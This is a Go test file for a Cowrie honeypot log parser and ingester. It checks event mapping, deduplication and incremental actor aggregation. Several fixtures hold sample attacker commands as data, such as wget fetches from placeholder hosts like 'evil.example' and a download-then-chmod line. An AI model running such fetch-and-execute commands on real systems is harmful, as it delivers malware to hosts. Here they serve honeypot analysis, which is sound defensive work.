package cowrie

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

func TestToEventCommand(t *testing.T) {
	rec := cowrieLine{
		EventID:    "cowrie.command.input",
		Timestamp:  "2026-05-21T12:00:00.000000Z",
		SrcIP:      "1.2.3.4",
		SrcPort:    4242,
		Username:   "root",
		Session:    "abc",
		Input:      "wget http://evil/p.sh",
		HASSH:      "hassh-123",
		SSHVersion: "SSH-2.0-libssh",
	}
	e, ok := toEvent(rec, `{"eventid":"cowrie.command.input"}`)
	if !ok {
		t.Fatalf("expected event to parse")
	}
	if e.Kind != "command" {
		t.Fatalf("expected command kind, got %s", e.Kind)
	}
	if e.HASSH != "hassh-123" {
		t.Fatalf("expected hassh, got %q", e.HASSH)
	}
	if e.Command == "" {
		t.Fatalf("expected command text")
	}
}

func TestToEventFileDownload(t *testing.T) {
	rec := cowrieLine{
		EventID:   "cowrie.session.file_download",
		Timestamp: "2026-05-21T12:00:00.000000Z",
		SrcIP:     "1.2.3.4",
		Session:   "s1",
		URL:       "http://evil.example/malware",
		Outfile:   "/var/lib/cowrie/downloads/abc123",
		SHA256:    "deadbeef",
	}
	e, ok := toEvent(rec, `{}`)
	if !ok {
		t.Fatal("expected parse")
	}
	if e.Kind != models.KindFileDown {
		t.Fatalf("kind=%s", e.Kind)
	}
	if e.Command != "http://evil.example/malware" {
		t.Fatalf("command=%q", e.Command)
	}
	if e.Filename != "/var/lib/cowrie/downloads/abc123" {
		t.Fatalf("filename=%q", e.Filename)
	}
}

func TestMapKindTunnel(t *testing.T) {
	k, ok := mapKind("cowrie.direct-tcpip.request")
	if !ok {
		t.Fatalf("expected tunnel kind")
	}
	if k != "tunnel" {
		t.Fatalf("expected tunnel, got %s", k)
	}
}

func TestParseReaderCountsSkippedLines(t *testing.T) {
	input := strings.Join([]string{
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1"}`,
		`{"eventid":`,
		`{"eventid":"cowrie.login.failed","timestamp":"not-a-time","src_ip":"1.2.3.4","username":"root","session":"s2"}`,
		`{"eventid":"cowrie.unknown","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4"}`,
	}, "\n")
	events, skipped, _, _, err := parseReader(strings.NewReader(input))
	if err != nil {
		t.Fatalf("parseReader: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected 1 parsed event, got %d", len(events))
	}
	if skipped != 3 {
		t.Fatalf("expected 3 skipped lines, got %d", skipped)
	}
}

func TestIngestFileReplaceKeepsJournalDataAndPersistsActorID(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	journalEvent := &models.Event{
		TS:     time.Date(2026, 5, 21, 10, 0, 0, 0, time.UTC),
		Source: models.SourceJournal,
		Kind:   models.KindInvalidUser,
		SrcIP:  "203.0.113.10",
		Raw:    "journal-line",
	}
	if err := st.InsertEvent(journalEvent); err != nil {
		t.Fatalf("insert journal event: %v", err)
	}
	if err := st.UpsertActor(&models.Actor{
		ID:         "journal:203.0.113.10",
		Source:     models.SourceJournal,
		PrimaryIP:  "203.0.113.10",
		FirstSeen:  journalEvent.TS,
		LastSeen:   journalEvent.TS,
		EventCount: 1,
	}); err != nil {
		t.Fatalf("insert journal actor: %v", err)
	}

	path := writeTempCowrieLog(t, `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"username":"root","session":"s1","hassh":"h1"}`)
	if _, err := IngestFile(st, path, nil, true); err != nil {
		t.Fatalf("ingest replace: %v", err)
	}

	events, err := st.EventsBySource(models.SourceJournal)
	if err != nil {
		t.Fatalf("load journal events: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected journal event to survive cowrie replace, got %d", len(events))
	}

	cowrieEvents, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatalf("load cowrie events: %v", err)
	}
	if len(cowrieEvents) != 1 {
		t.Fatalf("expected 1 cowrie event, got %d", len(cowrieEvents))
	}
	if cowrieEvents[0].ActorID == "" {
		t.Fatalf("expected cowrie event actor_id to be persisted")
	}
}

func TestIngestFileAppendDedupsByEventIdentity(t *testing.T) {
	st := openTestStore(t)
	defer st.Close()

	first := writeTempCowrieLog(t, `{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"username":"root","session":"s1","hassh":"h1"}`)
	second := writeTempCowrieLog(t, `{ "eventid" : "cowrie.login.failed", "timestamp" : "2026-05-21T12:00:00.000000Z", "src_ip" : "1.2.3.4", "src_port" : 2222, "username" : "root", "session" : "s1", "hassh" : "h1" }`)

	if _, err := IngestFileAppend(st, first, nil); err != nil {
		t.Fatalf("first append: %v", err)
	}
	if _, err := IngestFileAppend(st, second, nil); err != nil {
		t.Fatalf("second append: %v", err)
	}
	events, err := st.EventsBySource(models.SourceCowrie)
	if err != nil {
		t.Fatalf("load cowrie events: %v", err)
	}
	if len(events) != 1 {
		t.Fatalf("expected duplicate append to keep 1 event, got %d", len(events))
	}
}

func openTestStore(t *testing.T) *store.Store {
	t.Helper()
	st, err := store.Open(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	return st
}

func writeTempCowrieLog(t *testing.T, line string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "cowrie.json")
	if err := os.WriteFile(path, []byte(line+"\n"), 0o644); err != nil {
		t.Fatalf("write cowrie log: %v", err)
	}
	return path
}

// appendLine appends one JSON line to an existing cowrie log file (same inode),
// simulating cowrie writing more events between live-ingest ticks.
func appendLine(t *testing.T, path, line string) {
	t.Helper()
	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		t.Fatalf("open append: %v", err)
	}
	defer f.Close()
	if _, err := f.WriteString(line + "\n"); err != nil {
		t.Fatalf("append: %v", err)
	}
}

// actorSnapshot is a stable, comparable view of an actor's aggregate.
type actorSnapshot struct {
	ID          string
	EventCount  int
	UniqueUsers int
	PrimaryIP   string
	Intent      string
}

func snapshotActors(t *testing.T, st *store.Store) map[string]actorSnapshot {
	t.Helper()
	actors, err := st.ListActors(1000)
	if err != nil {
		t.Fatalf("list actors: %v", err)
	}
	out := map[string]actorSnapshot{}
	for _, a := range actors {
		out[a.ID] = actorSnapshot{
			ID:          a.ID,
			EventCount:  a.EventCount,
			UniqueUsers: a.UniqueUsers,
			PrimaryIP:   a.PrimaryIP,
			Intent:      a.Intent,
		}
	}
	return out
}

// TestIncrementalRebuildMatchesFullRebuild is the equivalence guard for the O1
// incremental cowrie actor rebuild: ingesting a log in several append ticks
// (incremental path) must produce the same actor aggregates as a single
// replace-mode ingest of the complete log (full rebuild path).
func TestIncrementalRebuildMatchesFullRebuild(t *testing.T) {
	lines := []string{
		`{"eventid":"cowrie.session.connect","timestamp":"2026-05-21T12:00:00.000000Z","src_ip":"1.2.3.4","src_port":2222,"session":"s1","hassh":"hashA"}`,
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:01.000000Z","src_ip":"1.2.3.4","username":"root","session":"s1","hassh":"hashA"}`,
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:00:02.000000Z","src_ip":"1.2.3.4","username":"admin","session":"s1","hassh":"hashA"}`,
		`{"eventid":"cowrie.command.input","timestamp":"2026-05-21T12:00:03.000000Z","src_ip":"1.2.3.4","input":"wget http://evil/x -O /tmp/x; chmod +x /tmp/x","session":"s1","hassh":"hashA"}`,
		// Second actor, different HASSH, different IP.
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:01:00.000000Z","src_ip":"5.6.7.8","username":"root","session":"s2","hassh":"hashB"}`,
		`{"eventid":"cowrie.command.input","timestamp":"2026-05-21T12:01:01.000000Z","src_ip":"5.6.7.8","input":"uname -a","session":"s2","hassh":"hashB"}`,
		// More events for actor A in a later tick.
		`{"eventid":"cowrie.login.failed","timestamp":"2026-05-21T12:02:00.000000Z","src_ip":"1.2.3.4","username":"git","session":"s3","hassh":"hashA"}`,
	}

	// --- Incremental path: append a few lines at a time across ticks. ---
	incStore := openTestStore(t)
	defer incStore.Close()
	incPath := filepath.Join(t.TempDir(), "inc.json")
	if err := os.WriteFile(incPath, []byte(lines[0]+"\n"+lines[1]+"\n"), 0o644); err != nil {
		t.Fatalf("seed inc log: %v", err)
	}
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 1: %v", err)
	}
	appendLine(t, incPath, lines[2])
	appendLine(t, incPath, lines[3])
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 2: %v", err)
	}
	appendLine(t, incPath, lines[4])
	appendLine(t, incPath, lines[5])
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 3: %v", err)
	}
	appendLine(t, incPath, lines[6])
	if _, err := IngestFileAppend(incStore, incPath, nil); err != nil {
		t.Fatalf("inc tick 4: %v", err)
	}

	// --- Full rebuild path: replace-ingest the complete log at once. ---
	fullStore := openTestStore(t)
	defer fullStore.Close()
	fullPath := filepath.Join(t.TempDir(), "full.json")
	all := ""
	for _, l := range lines {
		all += l + "\n"
	}
	if err := os.WriteFile(fullPath, []byte(all), 0o644); err != nil {
		t.Fatalf("write full log: %v", err)
	}
	if _, err := IngestFile(fullStore, fullPath, nil, true); err != nil {
		t.Fatalf("full ingest: %v", err)
	}

	inc := snapshotActors(t, incStore)
	full := snapshotActors(t, fullStore)
	if len(inc) != len(full) {
		t.Fatalf("actor count mismatch: incremental=%d full=%d\ninc=%+v\nfull=%+v", len(inc), len(full), inc, full)
	}
	for id, fa := range full {
		ia, ok := inc[id]
		if !ok {
			t.Errorf("actor %s present in full rebuild but missing from incremental", id)
			continue
		}
		if ia != fa {
			t.Errorf("actor %s aggregate mismatch:\n incremental=%+v\n full=%+v", id, ia, fa)
		}
	}
}
